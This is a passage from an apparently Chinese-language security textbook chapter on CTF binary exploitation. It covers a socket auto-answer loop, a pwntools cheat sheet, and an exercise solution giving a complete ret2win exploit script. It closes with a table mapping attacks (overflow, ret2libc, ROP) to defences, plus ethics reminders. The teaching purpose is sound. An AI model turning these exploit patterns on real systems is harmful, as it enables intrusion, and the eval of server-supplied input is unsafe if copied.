+        這個需求,其實<strong>第 41 章那條 CTF 學習線</strong>更早就鋪墊過了:最一開始的自動化練習,
+        甚至不用 pwntools,光用 Python 標準庫的 <code>socket</code> 就能跟一個「會連續出數學題的伺服器」自動對答如流:
+      </p>
+      <pre><code class="language-python"># 自動化的雛形:用標準庫 socket 跟「連續出題」的服務一問一答
+import socket, re
+
+s = socket.create_connection(("127.0.0.1", 9000))
+while True:
+    line = s.recv(4096).decode()           # 收一行
+    print(line)
+    if "FLAG{" in line:                    # 拿到旗就收工
+        print(re.search(r"FLAG\{[^}]*\}", line).group(0))
+        break
+    if "= ?" in line:                      # 看到 "12 + 7 = ?" 這種題目
+        expr = line.split(":")[1].replace("= ?", "").strip()
+        s.sendall((str(eval(expr)) + "\n").encode())   # 算出答案、送回去
+s.close()</code></pre>
+      <p>
+        看懂這個「收 → 判斷 → 算 → 送」的迴圈,你就懂了所有 Pwn 自動化的骨架。pwntools 只是把這套流程
+        包裝得更順手、又補上 Pwn 專用的「打包位址」工具。下面這張小抄,是你 90% 時間會用到的全部:
+      </p>
+      <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>pwntools 函式</th><th>它做什麼</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>process("./vuln")</code></td><td>在<strong>本機</strong>啟動題目程式(練習、找 offset 時用)。</td></tr>
+          <tr><td><code>remote("host", port)</code></td><td>連到<strong>遠端</strong>(獲授權的)題目服務——跟 <code>process</code> 介面一模一樣,改一行就能從本機切到遠端。</td></tr>
+          <tr><td><code>io.recvuntil(b"...")</code></td><td>一直收,直到看到指定字串為止(用來「等題目把提示印完」)。</td></tr>
+          <tr><td><code>io.recvline()</code></td><td>收一整行(常用來接「洩漏出來的位址」那一行)。</td></tr>
+          <tr><td><code>io.sendline(payload)</code></td><td>送出 payload,並自動補上換行。(<code>io.send</code> 則不補換行。)</td></tr>
+          <tr><td><code>p64(x)</code> / <code>p32(x)</code></td><td>把整數 <code>x</code> 打包成 8 / 4 bytes 的<strong>小端</strong>字串(寫位址必用)。</td></tr>
+          <tr><td><code>u64(b)</code> / <code>u32(b)</code></td><td>反向:把收回來的位元組還原成整數(讀洩漏的位址必用)。</td></tr>
+          <tr><td><code>flat(a, b, ...)</code></td><td>把一串「墊片 + 位址 + 位址…」自動接成完整 payload(整數會自動 <code>p64</code>)。</td></tr>
+          <tr><td><code>io.interactive()</code></td><td>把控制權交給你,手動操作拿到的 shell(例如 <code>cat flag.txt</code>)。</td></tr>
+        </tbody>
+      </table></div>
+      <p>
+        一個典型的 pwntools exploit,結構永遠是這幾段:<strong>① 載入 ELF / 連上題目 → ② 收提示
+        (<code>recvuntil</code>)→ ③ 組 payload(<code>flat</code> + <code>p64</code>)→ ④ 送出(<code>sendline</code>)
+        →(若需要)⑤ 收洩漏、用 <code>u64</code> 還原、算新位址、再送一發 → ⑥ <code>interactive</code> 收割。</strong>
+        你前面看到的 ret2win 與 ret2libc 腳本,都是這個骨架的不同填法。
+      </p>
+
+      <div class="callout tip">
+        <div class="ico">💡</div>
+        <div class="body">
+          <span class="c-title">同一份腳本,本機開發、遠端收割</span>
+          <p>pwntools 最體貼的設計,是 <code>process()</code> 和 <code>remote()</code> 的<strong>介面完全相同</strong>。
+          所以你的工作流是:在<strong>本機</strong>用 <code>process("./vuln")</code> 反覆除錯、找 offset、調 payload;
+          一切就緒後,只把那一行改成 <code>remote("授權的題目主機", 31337)</code>,同一份腳本就能去打<strong>獲得授權</strong>的遠端題目。
+          再強調一次:<code>remote</code> 的對象,只能是 CTF 主辦方明確提供給你練習的伺服器。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 72.6 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>一個(獲授權的)遠端題目,連上後會先印一行 <code>Give me your payload:</code>,然後讀你的輸入。
+          已知這是一支 No-PIE、No-canary 的 ret2win 程式,offset 為 <code>40</code>,<code>win</code> 位址為 <code>0x4011d6</code>。
+          請寫出 pwntools 腳本骨架,正確處理「等提示 → 送 payload」,並標出哪一行決定了「本機」或「遠端」。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python">from pwn import *
+
+# ↓↓↓ 這一行決定本機 / 遠端(介面相同,改這行即可) ↓↓↓
+# io = process("./vuln")                 # 本機除錯時用
+io = remote("授權的題目主機", 31337)      # 確認無誤後,打獲授權的遠端題
+
+OFFSET = 40
+win    = 0x4011d6
+
+io.recvuntil(b"Give me your payload:")    # ① 等題目把提示印完,再送
+payload = flat(b"A" * OFFSET, p64(win))   # ② 墊 40 + 蓋上 win(小端)
+io.sendline(payload)                      # ③ 送出
+
+io.interactive()                          # ④ 接管,讀出 FLAG{...}</code></pre>
+              <p>重點:<code>recvuntil</code> 確保我們<strong>等到題目印完提示</strong>才送(否則可能搶在程式還沒準備好讀就送出);
+              <code>flat(...)</code> 自動把 <code>0x4011d6</code> 這個整數 <code>p64</code> 成小端。
+              本機與遠端只差 <code>process</code> / <code>remote</code> 一行——這就是「本機開發、遠端收割」的威力。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>防禦視角:每一個攻擊,都對著一條防線</h2>
+      <p>
+        走完這趟攻擊之旅,該把帽子翻回白色那一面了。這一章真正想教你的,從來不是「如何打人」,
+        而是<strong>「攻擊者會怎麼想,所以我該怎麼守」</strong>。把這一章的每一招,對回它的剋星——
+        你會發現,它們整齊地呼應了<strong>第 36 章</strong>的每一條防禦原則:
+      </p>
+      <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>你在本章學到的攻擊</th><th>它利用的弱點</th><th>對應的防禦(呼應第 36 章)</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>逆向找出寫死的密碼 / 旗</td><td>把秘密放在使用者拿得到的二進位裡</td><td>秘密與驗證留在<strong>伺服器端</strong>;別在用戶端藏鑰匙(混淆只能拖延)。</td></tr>
+          <tr><td>溢位蓋掉旁邊的變數</td><td><code>gets</code> / <code>scanf("%s")</code> / 無上限的 <code>read</code></td><td><strong>邊界檢查</strong>:改用會帶長度上限的 <code>fgets</code>、<code>snprintf</code>、限定讀取量。</td></tr>
+          <tr><td>ret2win:蓋過返回位址</td><td>連續溢位能搆到返回位址</td><td>開啟 <strong>Stack Canary</strong>;同樣靠邊界檢查從源頭杜絕。</td></tr>
+          <tr><td>注入 shellcode 到堆疊</td><td>堆疊可執行</td><td>開啟 <strong>NX / DEP</strong>,讓資料區不可當程式碼跑。</td></tr>
+          <tr><td>寫死位址 / ret2libc / ROP</td><td>記憶體佈局可預測</td><td>開啟 <strong>ASLR + PIE</strong>,讓位址每次隨機。</td></tr>
+          <tr><td>洩漏位址打穿 ASLR</td><td>程式有「吐出位址」的管道</td><td>堵住資訊洩漏(別印出指標 / 位址);錯誤訊息對外沉默(第 36 章)。</td></tr>
+          <tr><td>拿到 shell 後 <code>cat flag</code></td><td>程式權限過大</td><td><strong>最小權限</strong>:程式別用 root 跑,即使被攻破也限縮損害。</td></tr>
+        </tbody>
+      </table></div>
+      <p>
+        看出這張表的弦外之音了嗎?<strong>每一道現代防護,都是某一個歷史攻擊逼出來的答案。</strong>
+        canary 是為了擋蓋返回位址、NX 是為了擋 shellcode、ASLR/PIE 是為了擋「寫死位址」。
+        而它們全部疊起來,就是<strong>第 36 章</strong>講的「縱深防禦」:一層被突破,還有下一層。
+        最徹底的那一層,則是從源頭——做好邊界檢查,或改用記憶體安全的語言,讓這整類漏洞根本無從發生。
+      </p>
+
+      <div class="callout key">
+        <div class="ico">🔑</div>
+        <div class="body">
+          <span class="c-title">理解攻擊,是為了更好地防禦</span>
+          <p>你現在不只是「聽說過」緩衝區溢位,而是<strong>親手算過 offset、親眼在 gdb 看過返回位址被蓋掉</strong>。
+          這份「具體」,正是防禦者最珍貴的直覺:當你寫下一個 <code>read</code> 時,你會本能地想到那 64 bytes 之後就是返回位址;
+          當你 code review 看到 <code>gets</code> 時,你會立刻起雞皮疙瘩。攻擊與防禦,從來不是兩種人,而是同一個工程師的兩種視角——
+          這也是<strong>第 36 章</strong>那句「永遠假設輸入是惡意的」最深刻的註腳。</p>
+        </div>
+      </div>
+
+      <h2>把這一章串起來</h2>
+      <p>
+        我們從「兩個動詞」出發——逆向是「讀懂」,Pwn 是「控制」——走完了 CTF 最硬核的兩條路:
+      </p>
+      <ul>
+        <li><strong>逆向工程:</strong>編譯是幾乎不可逆的門。用<strong>靜態分析</strong>(<code>file</code> / <code>strings</code> /
+        <code>objdump</code> / Ghidra)讀劇本、用<strong>動態分析</strong>(<code>gdb</code> 斷點、看暫存器與記憶體)看現場;
+        破解 crackme 的關鍵,是知道把注意力放在 <code>strcmp</code>、判斷點與可疑運算上(呼應<strong>第 21 章</strong>的暫存器與機器碼)。</li>
+        <li><strong>記憶體與堆疊:</strong>行程記憶體分成 text / data / heap / stack;stack frame 裡有區域變數、存起來的 rbp、
+        以及<strong>返回位址</strong>。堆疊往低位址長、緩衝區往高位址寫,這個方向差讓溢位能搆到返回位址。x86-64 用小端,
+        <code>p64</code> / <code>u64</code> 替你處理(呼應<strong>第 24 章</strong>)。</li>
+        <li><strong>緩衝區溢位 I(ret2win):</strong><code>checksec</code> 看防護 → <code>cyclic</code> 找 offset →
+        查 <code>win</code> 位址 → <code>payload = b"A"*offset + p64(win)</code> → pwntools 送出。它是
+        「資料越界 → 改寫返回位址 → 劫持執行」這條因果鏈的最小可運作版(呼應<strong>第 36 章</strong>)。</li>
+        <li><strong>緩衝區溢位 II(保護與 ret2libc):</strong>Canary 擋蓋返回位址、NX 擋 shellcode、ASLR/PIE 擋寫死位址;
+        當 NX 擋住 shellcode,改用 <strong>ret2libc</strong>——<strong>兩階段</strong>先洩漏位址打穿 ASLR、再呼叫
+        <code>system("/bin/sh")</code>;把這招一般化,就是 <strong>ROP</strong>。</li>
+        <li><strong>pwntools 自動化:</strong>「收 → 判斷 → 算 → 送」的迴圈。<code>process</code>(本機)/ <code>remote</code>(授權遠端)
+        介面相同;<code>recvuntil</code> / <code>sendline</code> 收送、<code>p64</code> / <code>u64</code> 打包位址、<code>flat</code> 組 payload。</li>
+        <li><strong>防禦視角:</strong>每一個攻擊都對著一條防線;每一道防護都是某個歷史攻擊逼出來的答案。
+        最徹底的修法,永遠是源頭的邊界檢查與記憶體安全語言。</li>
+      </ul>
+      <p>
+        最後,把這一章開頭那條線再描一次:你學會的這一切,是為了<strong>守</strong>。在自己的程式裡聞出漏洞的味道、
+        在自架或獲授權的靶場裡安全地練習、在發現別人的漏洞時負責任地揭露——這是白帽的本分。
+        技術是中性的,讓它成為盾,而不是矛。
+      </p>
+
+      <div class="callout note">
+        <div class="ico">📚</div>
+        <div class="body">
+          <span class="c-title">想更深入?延伸資源</span>
+          <p>本章對應「實戰資安 CTF」路線的 Pwn 與逆向兩大主題,最值得收藏的練習與參考:
+          <a href="https://pwn.college/">pwn.college</a>(美國 ASU 開設、系統而完整的二進位攻防免費課程,從組語、gdb 一路帶到 ROP/heap,
+          全程在它提供的<strong>授權靶機</strong>上練習,是入門 Pwn 的最佳起點)、
+          <a href="https://docs.pwntools.com/">pwntools 官方文件</a>(<code>process</code> / <code>remote</code> / <code>ROP</code> /
+          <code>ELF</code> / <code>p64</code> 等 API 的權威說明)、
+          <a href="https://picoctf.org/">picoCTF</a> 的 <strong>Binary Exploitation</strong> 與 <strong>Reverse Engineering</strong>
+          題組(由 CMU 主辦、對初學者極友善,題目皆為合法練習環境)。
+          逆向工具可從免費的 <a href="https://ghidra-sre.org/">Ghidra</a> 入手。
+          想打穩底層,別忘了回頭複習<strong>第 21 章</strong>(機器語言/暫存器)與<strong>第 24 章</strong>(記憶體/堆疊),
+          以及<strong>第 36 章</strong>(防禦性程式設計)——攻防本是一體。<strong>最重要的提醒</strong>:以上一切技術,
+          只在你<strong>自己編譯的程式</strong>或這些平台<strong>明確授權</strong>的題目上使用。這條界線,就是
+          <strong>第 41 章「倫理」</strong>反覆強調、也是區分白帽與罪犯的唯一標準。</p>
+        </div>
+      </div>
+
+    
